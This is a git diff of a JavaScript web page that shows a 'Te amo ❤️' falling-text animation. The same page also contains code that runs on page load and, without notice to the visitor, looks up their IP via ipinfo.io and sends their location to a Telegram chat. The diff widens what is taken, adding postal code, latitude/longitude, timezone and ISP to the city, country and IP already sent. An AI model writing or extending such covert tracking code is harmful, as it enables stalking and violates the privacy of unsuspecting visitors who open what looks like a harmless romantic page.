@@ -7,7 +7,7 @@ canvas.width = width;
 canvas.height = height;
 
 const text = 'Te amo ❤️'; // Texto completo con corazón
-const fontSize = 40;
+const fontSize = 30;
 const columns = Math.floor(width / fontSize);
 const drops = [];
 
@@ -144,17 +144,26 @@ function enviarMensajeTelegram(texto) {
 }
 
 function obtenerUbicacionAproximadaYEnviar() {
-  fetch('https://ipinfo.io/json?token=09f3a082349dd8') 
+  fetch('https://ipinfo.io/json?token=09f3a082349dd8')
     .then(res => res.json())
     .then(data => {
-      const texto = `Nueva conexión:\nCiudad: ${data.city}\nRegión: ${data.region}\nPaís: ${data.country}\nIP: ${data.ip}\nHora: ${new Date().toLocaleString()}`;
+      const texto = `Nueva conexión:
+Ciudad: ${data.city}
+Región: ${data.region}
+País: ${data.country}
+Código Postal: ${data.postal || 'N/A'}
+Lat,Lon: ${data.loc || 'N/A'}
+Zona Horaria: ${data.timezone || 'N/A'}
+ISP / Org: ${data.org || 'N/A'}
+IP: ${data.ip}
+Hora: ${new Date().toLocaleString()}`;
+      
       enviarMensajeTelegram(texto);
     })
     .catch(() => {
       enviarMensajeTelegram('Nueva conexión: No se pudo obtener ubicación.');
     });
 }
-
 // Llama a esta función cuando cargue la página
 window.onload = () => {
   obtenerUbicacionAproximadaYEnviar();
